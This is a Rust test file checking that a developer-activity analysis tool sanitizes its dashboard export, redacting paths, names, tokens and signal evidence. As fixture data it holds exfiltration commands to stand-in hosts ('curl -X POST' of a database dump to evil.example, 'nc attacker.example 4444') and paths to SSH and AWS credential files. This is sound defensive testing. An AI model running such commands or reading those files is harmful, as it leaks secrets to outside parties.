//! The export is the boundary between the machine and the dashboard.
//! These tests pin three things: every signal the code can emit has an
//! explicit policy; identifying content in a snapshot does not survive
//! into the serialized export; and the export still satisfies the fields
//! the dashboard's ingest endpoint requires.

use chrono::{Duration, Utc};
use conscience::ethics::models::*;
use conscience::export::{EvidencePolicy, POLICIES, SnapshotExport, policy_for};
use conscience::interval::Interval;
use conscience::snapshot::*;
use serde::Deserialize;
use std::path::Path;

/// Every `id: "..."` literal in the detector sources.
fn ids_in_source() -> Vec<String> {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    let files = [
        "src/ethics/signals.rs",
        "src/ethics/multi.rs",
        "src/analysis/authorship.rs",
    ];
    let mut ids = Vec::new();
    for f in files {
        let src = std::fs::read_to_string(root.join(f)).unwrap();
        for line in src.lines() {
            let t = line.trim();
            if let Some(rest) = t.strip_prefix("id: \"") {
                if let Some(end) = rest.find('"') {
                    ids.push(rest[..end].to_string());
                }
            }
        }
    }
    ids.sort();
    ids.dedup();
    ids
}

#[test]
fn every_signal_id_in_source_has_an_explicit_policy() {
    let ids = ids_in_source();
    assert!(
        ids.len() >= 40,
        "expected all signal ids, found {}",
        ids.len()
    );
    let missing: Vec<&String> = ids
        .iter()
        .filter(|id| !POLICIES.iter().any(|(k, _)| k == id))
        .collect();
    assert!(
        missing.is_empty(),
        "signals with no export policy (add them to export::POLICIES): {:?}",
        missing
    );
    // Unknown ids fall back to the safe side.
    assert_eq!(policy_for("some_future_signal"), EvidencePolicy::Redact);
}

fn signal(id: &str, title: &str, detail: &str, evidence: &str) -> Signal {
    Signal {
        id: id.into(),
        principle: Principle::Security,
        severity: Severity::Warning,
        title: title.into(),
        detail: detail.into(),
        evidence: evidence.into(),
    }
}

fn snapshot_with(signals: Vec<Signal>) -> Snapshot {
    let iv = Interval::last_days(7);
    Snapshot {
        schema_version: SCHEMA_VERSION,
        snapshot_id: "20260919T120000Z-abcdef".into(),
        project: ProjectIdentity {
            id: "0123456789abcdef".into(),
            name: "demo".into(),
            root: "/Users/someone/secret-client/demo".into(),
            github_repo: Some("org/demo".into()),
            worktrees: vec!["/Users/someone/secret-client/demo-wt".into()],
        },
        interval: iv,
        coverage: Coverage {
            sources: vec![
                SourceCoverage {
                    source: "github".into(),
                    status: SourceStatus::Failed,
                    detail: "token ghp_SECRETTOKEN rejected for /Users/someone".into(),
                },
                SourceCoverage {
                    source: "claude_code".into(),
                    status: SourceStatus::Collected,
                    detail: "3 sessions".into(),
                },
            ],
            ai_sessions_in_range: 3,
            ai_sessions_undated: 1,
            github_commits: 0,
            github_pull_requests: 0,
            manifest_found: true,
        },
        metrics: vec![Metric::observed("ai.sessions", 3.0, "sessions")],
        analyzer: AnalyzerInfo {
            version: "test".into(),
            config_fingerprint: "ffffffffffffffff".into(),
            thresholds_source: "defaults".into(),
        },
        analysis: EthicalAnalysis {
            scorecard: conscience::ethics::scorecard::build_scorecard(&signals),
            signals,
            reflections: vec![ReflectionQuestion {
                principle: Principle::Transparency,
                data_context: "Merged PRs: Add login".into(),
                question: "Is AI involvement disclosed?".into(),
            }],
        },
    }
}

#[test]
fn identifying_content_does_not_survive_export() {
    let snap = snapshot_with(vec![
        signal(
            "security_sensitive_file_read",
            "AI read sensitive files",
            "AI read 2 file(s) that may contain secrets.",
            "/Users/someone/.ssh/id_rsa, /Users/someone/.aws/credentials",
        ),
        signal(
            "security_network_exfiltration",
            "Potential network exfiltration",
            "Commands that could send data out.",
            "curl -X POST https://evil.example/upload -d @db.sql\nnc attacker.example 4444",
        ),
        signal(
            "security_prompt_injection_pr",
            "Potential prompt injection in PR descriptions",
            "1 PR flagged.",
            "PR #42 \"Refactor billing for Acme Corp\" (instruction override)",
        ),
        signal(
            "authorship_contributor_near_total_ai",
            "jane.doe: near-total AI authorship",
            "95% of jane.doe's 12 commits correlate with AI sessions.",
            "11 of 12 commits AI-correlated",
        ),
        signal(
            "ai_session_length_extreme",
            "Extremely long AI session",
            "Session 4b1c9d2e-aaaa-bbbb-cccc-1234567890ab ran for 14.0 hours.",
            "Started: 2026-09-18 09:00, Ended: 2026-09-18 23:00",
        ),
        signal(
            "github_single_contributor",
            "Single contributor",
            "All 30 commits come from jane.doe.",
            "30 commits, all from jane.doe",
        ),
        signal(
            "ai_turn_ratio_high",
            "High AI:Human turn ratio",
            "AI produces 6.0x more turns than humans.",
            "120 assistant turns vs 20 human turns",
        ),
        signal(
            "brand_new_unknown_signal",
            "New",
            "Something",
            "raw /tmp/path",
        ),
    ]);

    let export = SnapshotExport::from_snapshot(&snap);
    let json = serde_json::to_string(&export).unwrap();

    for leak in [
        "/Users/someone",
        "secret-client",
        "id_rsa",
        ".aws/credentials",
        "curl -X POST",
        "evil.example",
        "attacker.example",
        "Acme Corp",
        "PR #42",
        "jane.doe",
        "4b1c9d2e",
        "ghp_SECRETTOKEN",
        "demo-wt",
        "/tmp/path",
    ] {
        assert!(!json.contains(leak), "export leaked {:?}:\n{}", leak, json);
    }

    // Count-only evidence survived with the right numbers.
    let by_id = |id: &str| {
        export
            .analysis
            .signals
            .iter()
            .find(|s| s.id == id)
            .unwrap()
            .clone()
    };
    assert!(
        by_id("security_sensitive_file_read")
            .evidence
            .starts_with("2 file(s)")
    );
    assert!(
        by_id("security_network_exfiltration")
            .evidence
            .starts_with("2 command(s)")
    );
    assert!(
        by_id("security_prompt_injection_pr")
            .evidence
            .starts_with("1 pull request(s)")
    );
    assert_eq!(by_id("brand_new_unknown_signal").evidence, "");
    // Count-free evidence was kept verbatim.
    assert_eq!(
        by_id("ai_turn_ratio_high").evidence,
        "120 assistant turns vs 20 human turns"
    );

    // Structural omissions.
    assert_eq!(export.project.project_path, None);
    assert_eq!(export.coverage.sources[0].detail, "collection failed");
    assert_eq!(export.version, "2");

    // The record of what happened.
    let s = &export.sanitization;
    assert_eq!(s.evidence_replaced, 3);
    assert_eq!(s.evidence_redacted, 1);
    assert_eq!(s.signals_rewritten, 3);
    assert!(s.project_path_omitted);
    assert_eq!(s.failure_details_omitted, 1);
    assert!(s.summary().contains("3 signal(s)"));
}

/// The dashboard's required fields, copied from its ingest types. If this
/// stops deserializing, the server will reject pushes.
mod dashboard {
    use super::Deserialize;
    #[derive(Deserialize)]
    pub struct Payload {
        pub version: String,
        pub timestamp: chrono::DateTime<chrono::Utc>,
        pub project: Project,
        pub analysis: Analysis,
        pub stats: Stats,
    }
    #[derive(Deserialize)]
    pub struct Project {
        pub name: String,
        pub github_repo: Option<String>,
        pub project_path: Option<String>,
    }
    #[derive(Deserialize)]
    pub struct Stats {
        pub signal_count: usize,
        pub warning_count: usize,
        pub concern_count: usize,
        pub principles_covered: Vec<String>,
        pub ai_sessions: Option<u64>,
        pub total_output_tokens: Option<u64>,
        pub period_days: u32,
    }
    #[derive(Deserialize)]
    pub struct Analysis {
        pub signals: Vec<Signal>,
        pub scorecard: Vec<Dimension>,
        pub reflections: Vec<Reflection>,
    }
    #[derive(Deserialize)]
    pub struct Signal {
        pub principle: String,
        pub severity: String,
        pub title: String,
        pub detail: String,
        pub evidence: String,
    }
    #[derive(Deserialize)]
    pub struct Dimension {
        pub principle: String,
        pub auto_signals: Vec<Signal>,
        pub needs_human_input: bool,
        pub human_assessment: Option<String>,
    }
    #[derive(Deserialize)]
    pub struct Reflection {
        pub principle: String,
        pub data_context: String,
        pub question: String,
    }
}

#[test]
fn export_satisfies_the_dashboard_ingest_contract() {
    let snap = snapshot_with(vec![signal(
        "ai_turn_ratio_high",
        "High AI:Human turn ratio",
        "d",
        "120 assistant turns vs 20 human turns",
    )]);
    let json = serde_json::to_string(&SnapshotExport::from_snapshot(&snap)).unwrap();
    let p: dashboard::Payload = serde_json::from_str(&json).expect("dashboard can ingest");
    assert_eq!(p.version, "2");
    assert_eq!(p.project.name, "demo");
    assert_eq!(p.stats.signal_count, 1);
    assert_eq!(p.analysis.signals[0].principle, "security");
    assert_eq!(p.analysis.scorecard.len(), 7);
    assert_eq!(p.analysis.reflections.len(), 1);
    assert!(p.timestamp <= Utc::now() + Duration::seconds(1));
}
